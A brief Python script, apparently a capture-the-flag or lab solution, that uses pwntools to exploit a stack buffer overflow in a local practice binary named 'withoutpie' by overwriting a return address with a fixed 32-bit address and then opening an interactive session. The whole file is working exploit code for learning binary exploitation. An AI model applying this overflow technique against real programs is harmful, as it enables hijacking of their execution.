# coding: utf-8
from pwn import *
def exploit():
    proc= process("./withoutpie")
    p= b'a'*(0x71)+ b'a'*(0x4)+ p32(0x08049182)
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
